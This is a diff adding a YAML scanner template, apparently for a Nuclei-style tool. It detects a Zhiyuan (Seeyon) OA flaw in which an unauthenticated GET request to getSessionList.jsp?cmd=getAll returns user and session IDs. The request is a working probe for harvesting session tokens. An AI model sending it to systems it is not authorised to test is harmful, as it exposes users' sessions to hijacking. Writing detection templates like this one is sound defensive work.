@@ -1,0 +1,25 @@
+id: zhiyuan-oa-session-leak
+name: Zhiyuan OA Session Leak
+severity: medium
+confidence: tentative
+description: A vulnerability in Zhiyuan OA allows remote unauthenticated users access to sensitive session information via
+  the 'getSessionList.jsp' endpoint.
+reference: https://www.zhihuifly.com/t/topic/3345
+tags:
+- zhiyuan
+- leak
+- disclosure
+- seeyon
+- vuln
+requests:
+- method: GET
+  path: /yyoa/ext/https/getSessionList.jsp?cmd=getAll
+  matchers:
+  - type: body
+    words:
+    - <usrID>
+    - <sessionID>
+  - type: status
+    status:
+    - 200
+  condition: and
